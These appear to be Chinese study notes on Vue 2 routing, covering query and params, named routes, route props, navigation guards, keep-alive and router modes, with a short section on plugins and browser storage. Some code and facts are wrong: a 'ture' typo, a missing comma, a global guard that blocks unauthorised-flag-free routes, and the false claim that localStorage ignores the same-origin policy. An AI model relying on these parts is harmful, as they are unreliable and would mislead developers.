                <router-link active-class="a-active" to="bluecolor">蓝</router-link>
                <router-link active-class="a-active" to="redcolor">红</router-link>
            </div>
            <div class="content">
                <!-- 指定组件显示位置 -->
                <router-view></router-view>
            </div>
        </div>
    </div>
</template>

<script>
import Banner from './components/Banner.vue'
export default {
    name: 'App',
    components: { Banner }
}
</script>

<style>
* {
    margin: 0;
    padding: 0;
}

#tab {
    width: 500px;
    height: 400px;
    margin: 20px;
    border: #3a3737 solid 2px;
}

.typeColor {
    height: 314px;
    background-color: #f1eef8;

}

.tap {
    float: left;
    width: 20%;
    height: 80px;
    background-color: #f1eef8;
    vertical-align: middle;
}

.content {
    float: left;
    width: 80%;
    height: 80px;
    background-color: #f1eef8;
    padding: 10px;
    box-sizing: border-box;
}

a {
    display: block;
    height: 40px;
    text-align: center;
    line-height: 40px;
    color: rgb(37, 37, 36);
    text-decoration: none;
}

.a-active {
    color: white;
    background-color: rgb(32, 59, 45);
}
</style>
```

#### main.js

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入vue-router
import VueRotuer from 'vue-router'
//引入路由器
import router from './router'
//关闭Vue的生产提示
Vue.config.productionTip = false
// 应用router
Vue.use(VueRotuer)

//创建vm
new Vue({
  el: '#root',
  router,
  render: h => h(App),
})

```

## 路由的query参数

1. to的字符串写法。（数据包含特殊字符不能用例如：#）
2. to的对象写法。（可以包含特殊字符）
3. query在$route上，所以接收参数为：$route.query.id。

### components

#### Bannwe.vue

```html
<template>
  <div class="title">
    <h3>红 蓝 转 换</h3>
  </div>
</template>

<script>
export default {
    name:'Banner'
}
</script>

<style scoped>
 .title {
    height: 80px;
    text-align: center;
    line-height: 80px;
    color: #2f2d29;
}
</style>
```

### router/index.js

```javascript
import VueRouter from "vue-router";
import BlueColor from '../pages/BlueColor'
import RedColor from '../pages/RedColor'
import ColorOther from '../pages/ColorOther'
import ColorVerse from '../pages/ColorVerse'
import Detail from '../pages/Detail'

export default new VueRouter({
    routes: [
        {
            path: '/bluecolor',
            component: BlueColor,
            children: [
                {
                    path: 'colorOther',
                    component: ColorOther,
                    children: [
                        {
                            path: 'detail',
                            component: Detail
                        }
                    ]
                },
                {
                    path: 'colorverse',
                    component: ColorVerse
                }
            ]
        },
        {
            path: '/redcolor',
            component: RedColor
        }
    ]
})
```

### pages

#### RedColor.vue

```html
<template>
  <h3>red</h3>
</template>
<script>
export default {
    name:'RedColor'
}
</script>
<style></style>
```

#### BlueColor.vue

```html
<template>
  <div>
    <h3>blue</h3>
    <!-- 第二部分 -->
    <div clas="colorMsg">
      <div class="color-changing-over">
        <router-link active-class="a-active" to="/bluecolor/colorother">颜色衍生</router-link>
        <router-link active-class="a-active" to="/bluecolor/colorverse">来一小曲</router-link>
      </div>
      <router-view></router-view>
    </div>
  </div>
</template>

<script>
export default {
  name: 'BlueColor',
  mounted() {
    console.log('blue挂载了')
  },
  beforeDestroy() {
    console.log('blue销毁了')
  },
}
</script>
<style scoped>
.colorMsg {
  position: relative;
  width: 400px;
}
.color-changing-over {
  height: 40px;
}
.color-changing-over a {
  display: inline-block;
  width: 49%;
}
</style>
```

##### ColorVerse.vue

```html
<template>
    <div class="colorList">
        <ul>
            <li v-for="v in verseBlue" :key="v.id">{{ v.verse }}</li>
        </ul>
    </div>
</template>

<script>
import { nanoid } from 'nanoid'
export default {
    name: 'ColorVerse',
    data() {
        return {
            verseBlue: [
                { verse: '天空是蔚蓝色', id: nanoid() },
                { verse: '我和你走在蓝蓝的天空', id: nanoid() },
                { verse: '如果蓝天不拥有飞机', id: nanoid() }
            ]
        }
    },
}
</script>
<style scoped>
.colorList {
    position: absolute;
    left: 150px;
    top: 200px;
}
li {
    height: 25px;
    line-height: 25px;
    padding: 0 10px;
    color: #00eeee;
}
</style>
```

##### ColorOther.vue

```html
<template>
    <div class="colorList">
        <ul>
            <li v-for="b in colorBlue" :key="b.id">
                <!-- to的字符串写法(没有用：传递的数据不能包含特殊字符：例如 blue: '#00EEEE' ) -->
                <!-- <router-link :to="`/bluecolor/colorother/detail?msg=${b.msg}&blue=${b.blue}`">{{ b.blue
                }}</router-link> -->

                <!-- to的对象写法(有用：传递的数据可以包含特殊字符)  -->
                <router-link :to="{
                    path: '/bluecolor/colorother/detail',
                    query: {
                        blue: b.blue,
                        msg: b.msg
                    }
                }">
                    {{ b.blue }}
                </router-link>
            </li>
        </ul>
        <hr>
        <!-- 第三部分 -->
        <router-view></router-view>
    </div>
</template>

<script>
import { nanoid } from 'nanoid'
export default {
    name: 'ColorOther',
    data() {
        return {
            colorBlue: [
                { blue: '#00EEEE', id: nanoid(), msg: '天蓝' },
                { blue: '#70DB93', id: nanoid(), msg: '海蓝' },
                { blue: ' #5F9F9F', id: nanoid(), msg: '士官服蓝色' }
            ]
        }
    },
}
</script>

<style scoped>
.colorList {
    position: absolute;
    left: 150px;
    top: 200px;
}
li {
    height: 25px;
    line-height: 25px;
    padding: 0 10px;
    color: #00eeee;
}
a {
    color: #00eeee;
    text-decoration: none;
}
</style>

```

###### Detail.vue

```html
<template>
    <!-- 第三部分 -->
    <div class="color-other-detail">
        <ul>
            <li>颜色：{{ $route.query.blue }}</li>
            <li>说明：{{ $route.query.msg }}</li>
        </ul>
    </div>
</template>

<script>
export default {
    name: 'Detail',
    mounted() {
        console.log(this.$route)
        console.log('blueDetail挂载了')
    },
    beforeDestroy() {
        console.log('blueDetail销毁了')
    },
}
</script>

<style>
.color-other-detail {
    position: absolute;
    left: 0px;
    top: 100px;
    width: 400px;
}

li {
    color: #00eeee;
}
</style>
```

### App.vue

```html
<template>
    <div id="tab">
        <Banner />
        <div class="typeColor">
            <div class="tap">
                <router-link active-class="a-active" to="bluecolor">蓝</router-link>
                <router-link active-class="a-active" to="redcolor">红</router-link>
            </div>
            <div class="content">
                <!-- 指定组件显示位置 -->
                <router-view></router-view>
            </div>
        </div>
    </div>
</template>

<script>
import Banner from './components/Banner.vue'
export default {
    name: 'App',
    components: { Banner }
}
</script>

<style>
* {
    margin: 0;
    padding: 0;
}
#tab {
    width: 500px;
    height: 400px;
    margin: 20px;
    border: #3a3737 solid 2px;
}
.typeColor {
    height: 314px;
    background-color: #f1eef8;

}
.tap {
    float: left;
    width: 20%;
    height: 80px;
    background-color: #f1eef8;
    vertical-align: middle;
}
.content {
    float: left;
    width: 80%;
    height: 80px;
    background-color: #f1eef8;
    padding: 10px;
    box-sizing: border-box;
}
a {
    display: block;
    height: 40px;
    text-align: center;
    line-height: 40px;
    color: rgb(37, 37, 36);
    text-decoration: none;
}
.a-active {
    color: white;
    background-color: rgb(32, 59, 45);
}
</style>
```

### main.js

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入vue-router
import VueRotuer from 'vue-router'
//引入路由器
import router from './router'
//关闭Vue的生产提示
Vue.config.productionTip = false
// 应用router
Vue.use(VueRotuer)

//创建vm
new Vue({
  el: '#root',
  router,
  render: h => h(App),
})
```



------

## 路由的命名

修改【路由的query参数】代码实现。

1. 简化to的路径写法，简化路由的跳转。
2. 使用name设置路由命名。

### router/index.js

```javascript
import VueRouter from "vue-router";
import BlueColor from '../pages/BlueColor'
import RedColor from '../pages/RedColor'
import ColorOther from '../pages/ColorOther'
import ColorVerse from '../pages/ColorVerse'
import Detail from '../pages/Detail'

export default new VueRouter({
    routes: [
        {
            // 命名
            name: 'bcolor',
            path: '/bluecolor',
            component: BlueColor,
            children: [
                {
                    path: 'colorOther',
                    component: ColorOther,
                    children: [
                        {
                            // 命名
                            name:'xiangqing'
                            path: 'detail',
                            component: Detail
                        }
                    ]
                },
                {
                    path: 'colorverse',
                    component: ColorVerse
                }
            ]
        },
        {
            path: '/redcolor',
            component: RedColor
        }
    ]
})
```

### ColorOther.vue

```html
<router-link :to="{
                    // 命名路由写法
                    name: 'xiangqing',
                  	// 未命名路由写法
                    // path: '/bluecolor/colorother/detail',
                    query: {
                        blue: b.blue,
                        msg: b.msg
                    }
                }">
                    {{ b.blue }}
                </router-link>
```

### App.vue

```html
<!-- 未命名路由写法 -->
<router-link active-class="a-active" to="bluecolor">蓝</router-link>
<!-- 命名路由写法 -->
<router-link active-class="a-active" :to={name:'bcolor'}>蓝</router-link>
```



------

## 路由的params参数

修改【路由的query的参数】代码实现

1. to的字符串写法。（数据包含特殊字符不能用例如：#）
2. to的对象写法。（可以包含特殊字符）
3. **不允许使用path**，只能使用路由的命名方式。
4. 接收参数：$route.params.blue

### ColorOther.vue

```html
<ul>
    <li v-for="b in colorBlue" :key="b.id">
        <!-- to的字符串写法 -->
        <router-link :to="`/bluecolor/colorother/detail/${b.blue}/${b.msg}`">{{ b.blue }}</router-link> 
        <!-- to的对象写法 -->
        <router-link :to="{
            name: 'xiangqing',
            // path: '/bluecolor/colorother/detail', // 不允许使用path
            params: {
                blue: b.blue,
                msg: b.msg
            }
        }">
            {{ b.blue }}
        </router-link>
    </li>
</ul>
```

### router/index.js

```javascript
children: [
	{
		name: 'xiangqing',
        // 占位
		path: 'detail/:blue/:msg',
		component: Detail
	}
]
```

### Detail.vue

```html
<li>颜色：{{ $route.params.blue }}</li>
<li>颜色：{{ $route.params.msg }}</li>
```

------

## 路由的props配置

【路由的query [ params ] 的参数】代码增添配置实现。
配置目的：优化模板代码冗余。

1. 谁接收谁配置props。
2. 值为对象配置写法。（所有的key-value都会以props形式发送）
3. 值为布尔值。若为真就会把该路由组件收到的params参收以props接收。只适用params参数。
4. 值为函数。query和params参数都适用。因为可以操作$route。

### 值为对象写法

#### router/index.js

```javascript
children: [
    {
        name: 'xiangqing',
        path: 'detail/:blue/:msg',
        component: Detail,
        // 对象（死数据）
        props: { name: 'yzl', hot: 412 }
    }
]
```

#### Detail.vue

```html
<li>name:{{ name }}</li>
<li>hot:{{ hot }}</li>
......
<script>
	......
    props:['name','hot'],
    .....
</script>
```

------

### 值为布尔值写法

【路由的query [ params ] 的参数】代码增添配置实现。

1. 只适用于params参数，query参数用计算属性。

#### router/index.js

```javascript
children: [
    {
        name: 'xiangqing',
        path: 'detail/:blue/:msg',
        component: Detail,
        // 布尔值
        props: ture
    }
]
```

#### Dateil.vue

```html
......
<!-- 原写法  -->
<li>颜色：{{ $route.params.blue }}</li>
<li>颜色：{{ $route.params.msg }}</li>
<!-- 后写法 -->
<li>颜色：{{ blue }}</li>
<li>颜色：{{ msg }}</li>
......
<script>
	......
    props:['blue','msg'],
    .....
</script>
```

------

### 值为函数写法

#### router/index.js

```javascript
children: [
    {
        name: 'xiangqing',
        path: 'detail/:blue/:msg',
        component: Detail,
        // 函数(回调函数)
        props($route){
            return{ 
                blue:$route.params.blue,
                msg:$route.params.msg
            }
        }
        // 解构赋值（query同理）
         props({params}){
            return{ 
                blue:params.blue,
                msg:params.msg
            }
        }
        // plus结构赋值的连续写法
          props({params:{blue,msg}}){
            return{ 
               blue,
               msg
            }
        }
    }
]
```

#### Dateil.vue

```html
......
<!-- 原写法  -->
<li>颜色：{{ $route.params.blue }}</li>
<li>颜色：{{ $route.params.msg }}</li>
<!-- 后写法 -->
<li>颜色：{{ blue }}</li>
<li>颜色：{{ msg }}</li>
......
<script>
	......
    props:['blue','msg'],
    .....
</script>
```

### 值为函数写法（完整）

#### components

##### Banner.vue

```html
<template>
  <div class="title">
    <h3>红 蓝 转 换</h3>
  </div>
</template>
<script>
export default {name: 'Banner'}
</script>
<style scoped>
.title {
  height: 80px;
  text-align: center;
  line-height: 80px;
  color: #2f2d29;
}
</style>
```

#### router/index.js

```javascript
import VueRouter from "vue-router";
import BlueColor from '../pages/BlueColor'
import RedColor from '../pages/RedColor'
import ColorOther from '../pages/ColorOther'
import ColorVerse from '../pages/ColorVerse'
import Detail from '../pages/Detail'

export default new VueRouter({
    routes: [
        {
            path: '/bluecolor',
            component: BlueColor,
            children: [
                {
                    path: 'colorOther',
                    component: ColorOther,
                    children: [
                        {
                            name: 'xiangqing',
                            path: 'detail/:blue/:msg',
                            component: Detail,
                            props({ params: { blue, msg } }) {
                                 return { blue,msg }
                            }
                        }
                    ]
                },
                {
                    path: 'colorverse',
                    component: ColorVerse
                }
            ]
        },
        {
            path: '/redcolor',
            component: RedColor
        }
    ]
})
```

#### pages

##### RedColor.vue

```html
<template><h3>red</h3></template>
<script>
export default {name:'RedColor'}
</script>
<style></style>
```

##### BlueColor.vue

```html
<template>
  <div>
    <h3>blue</h3>
    <!-- 第二部分 -->
    <div clas="colorMsg">
      <div class="color-changing-over">
        <router-link active-class="a-active" to="/bluecolor/colorother">颜色衍生</router-link>
        <router-link active-class="a-active" to="/bluecolor/colorverse">来一小曲</router-link>
      </div>
      <router-view></router-view>
    </div>
  </div>
</template>

<script>
export default {name: 'BlueColor'}
</script>
<style scoped>
.colorMsg {
  position: relative;
  width: 400px;
}
.color-changing-over {
  height: 40px;
}
.color-changing-over a {
  display: inline-block;
  width: 49%;
}
</style>
```

###### ColorVerse.vue

```html
<template>
    <div class="colorList">
        <ul>
            <li v-for="v in verseBlue" :key="v.id">{{ v.verse }}</li>
        </ul>
    </div>
</template>

<script>
import { nanoid } from 'nanoid'
export default {
    name: 'ColorVerse',
    data() {
        return {
            verseBlue: [
                { verse: '天空是蔚蓝色', id: nanoid() },
                { verse: '我和你走在蓝蓝的天空', id: nanoid() },
                { verse: '如果蓝天不拥有飞机', id: nanoid() }
            ]
        }
    },
}
</script>
<style scoped>
.colorList {
    position: absolute;
    left: 150px;
    top: 200px;
}
li {
    height: 25px;
    line-height: 25px;
    padding: 0 10px;
    color: #00eeee;
}
</style>
```

###### ColorOther.vue

```html
<template>
    <div class="colorList">
        <ul>
            <li v-for="b in colorBlue" :key="b.id">
                <!-- to的对象写法 -->
                <router-link :to="{
                    name: 'xiangqing',
                    params: {
                        blue: b.blue,
                        msg: b.msg
                    }
                }">
                    {{ b.blue }}
                </router-link>
            </li>
        </ul>
        <hr>
        <!-- 第三部分 -->
        <router-view></router-view>
    </div>
</template>

<script>
import { nanoid } from 'nanoid'
export default {
    name: 'ColorOther',
    data() {
        return {
            colorBlue: [
                { blue: '00EEEE', id: nanoid(), msg: '天蓝' },
                { blue: '70DB93', id: nanoid(), msg: '海蓝' },
                { blue: '5F9F9F', id: nanoid(), msg: '士官服蓝色' }
            ]
        }
    },
}
</script>

<style scoped>
.colorList {
    position: absolute;
    left: 150px;
    top: 200px;
}
li {
    color: #00eeee;
}
a {
    display: inline-block;
    color: #00eeee;
    text-decoration: none;
}
</style>
```

###### Detail.vue

```html
<template>
    <!-- 第三部分 -->
    <div class="color-other-detail">
        <ul>
            <li>颜色：{{ blue }}</li>
            <li>颜色：{{ msg }}</li>
        </ul>
    </div>
</template>

<script>
export default {
    name: 'Detail',
    props: ['blue', 'msg']
}
</script>

<style>
.color-other-detail {
    position: absolute;
    left: 250px;
    top: 8px;
    width: 400px;
}
li {
    color: #00eeee;
}
</style>
```



#### App.vue

```html
<template>
    <div id="tab">
        <Banner />
        <div class="typeColor">
            <div class="tap">
                <router-link active-class="a-active" to="bluecolor">蓝</router-link>
                <router-link active-class="a-active" to="redcolor">红</router-link>
            </div>
            <div class="content">
                <!-- 指定组件显示位置 -->
                <router-view></router-view>
            </div>
        </div>
    </div>
</template>

<script>
import Banner from './components/Banner.vue'
export default {
    name: 'App',
    components: { Banner }
}
</script>

<style>
* {
    margin: 0;
    padding: 0;
}
#tab {
    width: 500px;
    height: 400px;
    margin: 20px;
    border: #3a3737 solid 2px;
}
.typeColor {
    height: 314px;
    background-color: #f1eef8;

}
.tap {
    float: left;
    width: 20%;
    height: 80px;
    background-color: #f1eef8;
    vertical-align: middle;
}
.content {
    float: left;
    width: 80%;
    height: 80px;
    background-color: #f1eef8;
    padding: 10px;
    box-sizing: border-box;
}
a {
    display: block;
    height: 40px;
    text-align: center;
    line-height: 40px;
    color: rgb(37, 37, 36);
    text-decoration: none;
}
.a-active {
    color: white;
    background-color: rgb(32, 59, 45);
}
</style>
```

#### main.js

```javascript
//引入Vue
import Vue from 'vue'
//引入App
import App from './App.vue'
//引入vue-router
import VueRotuer from 'vue-router'
//引入路由器
import router from './router'
//关闭Vue的生产提示
Vue.config.productionTip = false
// 应用router
Vue.use(VueRotuer)

//创建vm
new Vue({
  el: '#App',
  router,
  render: h => h(App),
})
```



------

## 路由的其它

### 路由的跳转模式

1. <router-link>的replace模式：破坏浏览器上一条记录。一直保持当前一条记录在栈顶。（替换记录）
2. <router-link>的push模式（默认）：不破坏上一条记录。一直压入栈中。（保存记录）

------

### 路由的编程式跳转

修改params配置代码实现。

#### ColorOther.vue

实现push查看和replace查看

```html
<template>
    <div class="colorList">
        <ul>
            <li v-for="b in colorBlue" :key="b.id">
                <!-- to的对象写法 -->
                <router-link :to="{
                    name: 'xiangqing',
                    params: {
                        blue: b.blue,
                        msg: b.msg
                    }
                }">
                    {{ b.blue }}
                </router-link>
                <button @click="pushShow(b)">push查看</button>
                <button @click="replaceShow(b)">replace查看</button>
            </li>
        </ul>
        <hr>
        <!-- 第三部分 -->
        <router-view></router-view>
    </div>
</template>

<script>
import { nanoid } from 'nanoid'
export default {
    name: 'ColorOther',
    data() {
        return {
            colorBlue: [
                { blue: '00EEEE', id: nanoid(), msg: '天蓝' },
                { blue: '70DB93', id: nanoid(), msg: '海蓝' },
                { blue: '5F9F9F', id: nanoid(), msg: '士官服蓝色' }
            ]
        }
    },
    mounted() {
        console.log(this.$route)
        console.log('blue-Other挂载了')
    },
    beforeDestroy() {
        console.log('blueOther销毁了')
    },
    methods: {
        pushShow(b) {
            console.log('pushShow调用了')
            this.$router.push({
                name: 'xiangqing',
                params: {
                    blue: b.blue,
                    msg: b.msg
                }
            })
        },
        replaceShow(b) {
            console.log('replaceShow调用了')
            this.$router.replace({
                name: 'xiangqing',
                params: {
                    blue: b.blue,
                    msg: b.msg
                }
            })
        }
    }
}
</script>

<style scoped>
.colorList {
    position: absolute;
    left: 150px;
    top: 200px;
}

li {
    color: #00eeee;
}
a {
    display: inline-block;
    color: #00eeee;
    text-decoration: none;
}
</style>
```

#### App.vue

```html
<template>
  <div class="title">
    <h3>红 蓝 转 换</h3>
    <button @click="forward">forward</button>
    <button @click="back">back</button>
    <button @click="go">go</button>
  </div>
</template>

<script>
export default {
  name: 'Banner',
  methods: {
    back() {
      this.$router.back()
    },
    forward() {
      this.$router.forward()
    },
    go() {
      // this.$router.go(1) // 前一步
      this.$router.go(-1) // 退三步
    }
  }
}
</script>

<style scoped>
.title {
  height: 80px;
  text-align: center;
  line-height: 80px;
  color: #2f2d29;
}
</style>
```

------

### 路由的缓存

1. 想要缓存什么就去展示的组件里面设置。（即 router-view 所在的组件）
2. keep-alive 标签包裹并设置 include 属性。
3. include设置要缓存包含的**组件名**。
4. 不设置include属性默认缓存所有组件。
5. 多个缓存组件inclued用数组写法。   :include="[ 'aaa', 'bbb' ]"
6. 【vue3】`<KeepAlive>` 是一个内置组件，它的功能是在多个组件间动态切换时缓存被移除的组件实例。

作用：保存组件的挂载不销毁。

例子：修改【params参数的代码】实现ColorVerse.vue缓存输出框，不缓存ColorOther.vue

#### ColorVerse.vue

```html
<template>
  <div>
    <h3>blue</h3>
    <!-- 第二部分 -->
    <div clas="colorMsg">
      <div class="color-changing-over">
        <router-link active-class="a-active" to="/bluecolor/colorother">颜色衍生</router-link>
        <router-link active-class="a-active" to="/bluecolor/colorverse">来一小曲</router-link>
      </div>
      <!-- 路由的缓存:保持ColorVerse的挂载 -->
      <keep-alive include="ColorVerse">
        <router-view></router-view>
      </keep-alive>
    </div>
  </div>
</template>

<script>
export default {
  name: 'BlueColor',
  mounted() {
    console.log('blue-挂载了')
  },
  beforeDestroy() {
    console.log('blue-销毁了')
  },
}
</script>

<style scoped>
.colorMsg {
  position: relative;
  width: 400px;
}

.color-changing-over {
  height: 40px;
}

.color-changing-over a {
  display: inline-block;
  width: 49%;
}
</style>
```

------

### 路由的声明周期钩子

1. 路由组件独有的声明周期钩子activated和deactived。
2. **activated**激活调用（组件被查看时）。
3. **deactivated**失活调用（组件被切换走）。

------

#### ColorVerse.vue

实现：在路由的缓存基础上用定时器增加一个透明度会变化的h2标签，组件被销毁时停止变化。

问题：如果用传统的mounted挂载事件，有设置缓存的路由，被切走时不会被销毁，则原来要被销毁的定时器任务一直在执行，造成浪费。

解决：使用路由独有的生命周期钩子。

```html
<template>
    <div class="colorList">
        <ul>
            <li>
                <h2 :style="{ opacity }">嗨起来！！！</h2><br>
            </li>
            <li v-for="v in verseBlue" :key="v.id">{{ v.verse }} <input type="text"></li>
        </ul>
    </div>
</template>

<script>
import { nanoid } from 'nanoid'
export default {
    name: 'ColorVerse',
    data() {
        return {
            verseBlue: [
                { verse: '天空是蔚蓝色', id: nanoid() },
                { verse: '我和你走在蓝蓝的天空', id: nanoid() },
                { verse: '如果蓝天不拥有飞机', id: nanoid() }
            ],
            opacity: 1
        }
    },
    /*  mounted() {
         // console.log(this.$route)
         console.log('color-verse挂载了')
         this.timer = setInterval(() => {
             // console.log('计数中')
             this.opacity -= 0.01
             if (this.opacity <= 0) {
                 this.opacity = 1
             }
         }, 16)
     },
     beforeDestroy() {
         console.log('color-verse销毁了')
         // 清除定时任务(路由被缓存不会执行)
         clearInterval(this.timer)
     }, */
    activated() {
        // 激活调用（组件被查看时）
        console.log('color-verse激活了')
        this.timer = setInterval(() => {
            console.log('计数中')
            this.opacity -= 0.01
            if (this.opacity <= 0) {
                this.opacity = 1
            }
        }, 16)
    },
    deactivated() {
        // 失活调用（组件被切换走）
        console.log('color-verse失活了')
        // 清除定时任务
        clearInterval(this.timer)
    }
}
</script>

<style scoped>
.colorList {
    position: absolute;
    left: 150px;
    top: 200px;
}

li {
    height: 25px;
    line-height: 25px;
    padding: 0 10px;
    color: #00eeee;
}
</style>
```

------

# 全局路由

## 全局路由守卫

根据localhost里面的key：value来决定是否展示组件(ColorOther.vue和ColorVerse.vue)。（权限设置）

### 前置全局路由守卫

#### router/index.js

实现：color为blue才能显示【来一小曲】【towother】

```javascript
import VueRouter from "vue-router";
import BlueColor from '../pages/BlueColor'
import RedColor from '../pages/RedColor'
import ColorOther from '../pages/ColorOther'
import ColorVerse from '../pages/ColorVerse'
import Detail from '../pages/Det	ail'

/*
 1. 取消直接暴露router，使用变量承接。
 2. 暴露之前使用API的beforeEach调用一个回调函数。
 3. 路由每一次活动都会调用这个函数（切换之前调用和初始化时也调用）。
 4. 回调函数接收三个参数（to:你去哪里，from:你来自哪里，next:放行）
*/
const router = new VueRouter({
    routes: [
        {
            name: 'onered',
            path: '/redcolor',
            component: RedColor,
            meta: { title: 'OneRed' },
        },
        {
            name: 'oneblue',
            path: '/bluecolor',
            component: BlueColor,
            meta: { title: 'OneBlue' },
            children: [
                {
                    name: 'towverse',
                    path: 'colorverse',
                    component: ColorVerse,
                    meta: { title: 'TowVerse' },
                },
                {
                    name: 'towother',
                    path: 'colorOther',
                    component: ColorOther,
                    meta: { title: 'TowOther',isAuth:true },
                    children: [
                        {
                            name: 'threedetail',
                            path: 'detail/:blue/:msg',
                            component: Detail,
                            meta: { title: 'ThreeDetail' },
                            props({ params: { blue, msg } }) {
                                return {
                                    blue,
                                    msg
                                }
                            }
                        }
                    ]
                },

            ]
        },

    ]
})

// 前置路由守卫
router.beforeEach((to, from, next) => {
    // console.log(to, from)
    console.log('前置路由守卫')

   if (to.meta.isAuth) {
        // 判断是否去需要授权显示区域
        if (to.path == '/bluecolor/colorother' || to.name == 'towother') {
            //判断是否color为blue
            if (localStorage.getItem('color') === 'blue') {
                console.log('color is blue')
                next()
            } else {
                alert('color is not blue!')
            }
        } else {
            next()
        }
    }
})
// 后置路由守卫

export default router
```

### 后置全局路由守卫

在【前置全局路由守卫】增加代码，实现路由跳转时网页title发生相应改变.

1. 每个路由配置meta{title:'xxx'}。
2. 配置后置全局路由守卫修改网页的title。

```javascript
// 后置路由守卫
router.afterEach((to, from) => {
    console.log('后置路由守卫')
    /* 如果设置在beforeEach */
    // 1.页面一加载还是有undefined，要修改html的title标签内容为hello。
    // 2.权限不对，跳转不了，还是改了title。
    // 3.虽然代码可以解决1和2问题，但相当麻烦。所以配置在afterEach
    document.title = to.meta.title || 'hello'
})
```

## 独享路由守卫

1. 直接在路由里面配置。
2. 没有独享后置路由守卫，只有独享前置路由守卫

限制ColorVerse的显示

```javascript
{
    name: 'towverse',
    path: 'colorverse',
    component: ColorVerse,
    meta: { title: 'TowVerse' },
    // 独享前置路由守卫
    beforeEnter: (to, from, next) => {
        console.log('独享前置路由守卫')
        // 判断是否去需要授权显示区域
        if (to.path == '/bluecolor/colorverse' || to.name == 'towverse') {
            //判断是否color为blue
            if (localStorage.getItem('color') === 'blue') {
                console.log('color is blue')
                next()
            } else {
                alert('color is not blue!')
            }
        } else {
            next()
        }
    }
},
```

## 组件内路由守卫

```html
<template>
  <h3>red</h3>
</template>

<script>
export default {
  name: 'RedColor',
  mounted() {
    console.log(this.$route)
  },
  // 通过路由规则，进入该组件时被调用
  beforeRouteEnter(to, from, next) {
	console.log('RedColor---beforeRouteEnter')
      next()
  },
  // 通过路由规则，离开该组件时被调用
  beforeRouteLeave(to, from, next) {
 	console.log('RedColor---beforeRouteLeave')
    next()
  }
}
</script>

<style></style>
```

------

## 其它

### 判断是否路由要走守卫的配置

```javascript
import VueRouter from "vue-router";
import BlueColor from '../pages/BlueColor'
import RedColor from '../pages/RedColor'
import ColorOther from '../pages/ColorOther'
import ColorVerse from '../pages/ColorVerse'
import Detail from '../pages/Detail'

/*
 1. meta:{}（路由元信息）提供的容器存放自己的配置信息。
 2. 在里面配置属性isAuth: true。
 3. 根据配置来判断是否走守卫。
*/
const router = new VueRouter({
    routes: [
        {
            name: 'onered',
            path: '/redcolor',
            component: RedColor,
        },
        {
            name: 'oneblue',
            path: '/bluecolor',
            component: BlueColor,
            children: [
                {
                    name: 'towverxe',
                    path: 'colorverse',
                    component: ColorVerse,
                    // 自定义配置是否授权，进行权限校验
                    meta: { isAuth: true }
                },
                {
                    name: 'towother',
                    path: 'colorOther',
                    component: ColorOther,
                    children: [
                        {
                            name: 'threedetail',
                            path: 'detail/:blue/:msg',
                            component: Detail,
                            props({ params: { blue, msg } }) {
                                return {
                                    blue,
                                    msg
                                }
                            }
                        }
                    ]
                },

            ]
        },

    ]
})

router.beforeEach((to, from, next) => {
    console.log(to, from)
    console.log('守卫开始')
    // 验证显示区域是否需要授权
    if (to.meta.isAuth) {
        // 判断是否去需要授权显示区域
        if (to.path == '/bluecolor/colorother' || to.name == 'towother') {
            //判断是否color为blue
            if (localStorage.getItem('color') === 'blue') {
                console.log('color is blue')
                next()
            } else {
                alert('color is not blue!')
            }
        } else {
            next()
        }
    }
})

export default router
```

------

### 执行顺序

组件路由A进入组件路由B：组件路由A离开>全局前置路由>独享路由B>组件路由B进入>全局后置路由

组件路由B离开组件路由A：组件路由B离开>全局前置路由>独享路由A>组件路由A进入>全局后置路由

------

### 路由器的两种工作模式

1. 对于一个url来说，什么是hash值？—— #及其后面的内容就是hash值。
2. hash值不会包含在 HTTP 请求中，即：hash值不会带给服务器。
3. hash模式：
   1. 地址中永远带着#号，不美观 。
   2. 若以后将地址通过第三方手机app分享，若app校验严格，则地址会被标记为不合法。
   3. 兼容性较好。
4. history模式：
   1. 地址干净，美观 。
   2. 兼容性和hash模式相比略差。
   3. 应用部署上线时需要后端人员支持，解决刷新页面服务端404的问题。

如何配置模式：

```javascript
const router = new VueRouter({
    mode:'history',
    ......
})
```

------

# 其它



------

## 插件的使用

**作用**：增强vue功能，实现多个功能的集合js文件。**本质**：包含install方法的一个对象，install的第一个参数是Vue，第二个以后的参数是插件使用者传递的数据。

1. 定义插件xxx.js（plugins,js）

   ```javascript
   export default {
       // 一定暴露一个对象，并且有install方法
       install(Vue, x, y, z) {
           // console.log('@@Install',Vue)
           // 全局过滤器
           Vue.filter('myFilters', function (val) {
               return val.slice(5, 9)
           })
           // 全局指令
           Vue.directive('fbind-test', {
               // 指令于元素绑定成功时
               bind(element, binding) {
                   element.value = binding.value
               },
               // 元素被插入页面完成时
               inserted(element) {
                   element.focus()
               },
               // 指令所在模板被重新解析时
               update(element, binding) {
                   element.value = binding.value
               }
           })
           //定义混入
           Vue.mixin({
               data() {
                   return {
                       x: 100,
                       y: 200
                   }
               }
           })
           // Vue原型定义一个方法
           Vue.prototype.hello = () => { alert('hello world' + x + y + z) }
       }
   }
   ```
```
   
2. 入口文件main,js中使用插件：Vue.use()
   
   ```javascript
   // 引入插件
   import plugins from './plugins'
   
   //应用插件
   Vue.use(plugins, 1, 2, 3)
```

## 组件的样式

npm install --save-dev less-loader less

```html
<template>
	<div class = "demo">
        <h3>我是子组件</h3>
    </div>
</template>
<script>
export default{
    naem:"YZling",
}
</script>
<style scoped>
.demo {
  background-color: blue;
}
</style>


<template>
      <!-- 因为子组件最外层样式选择和父组件一样所以背景不是蓝色是虹色 -->
      <YZling />
</template>
<script>
import YZling from "./YZLing.vue"
export default{
    naem:"VSinger",
    components:{YZling}
}
</script>
<style scoped>
/* 组件类名相同后引入显示颜色 */
/* scoped 局部样式 */
.demo {
  background-color: red;
}
</style>


```

## 浏览器本地存储

1. **数据生命周期**:
   - `sessionStorage`: 存储在 `sessionStorage` 中的数据在当前会话中有效。当用户关闭浏览器标签或窗口时，`sessionStorage` 中的数据会被销毁。
   - `localStorage`: 存储在 `localStorage` 中的数据没有过期时间，除非用户主动清除浏览器缓存或网站进行数据清理，否则数据会一直保留。
2. **数据作用域**:
   - `sessionStorage`: 数据在同一个窗口（tab页）或者同一个窗口中打开的iframe之间是共享的，但在不同窗口之间是隔离的。（ `localStorage` 受同源策略限制，只有在相同域名下的页面之间才能共享数据。）
   - `localStorage`: 数据在同一个域名下的所有窗口和页面之间是共享的，不受同源策略的限制。
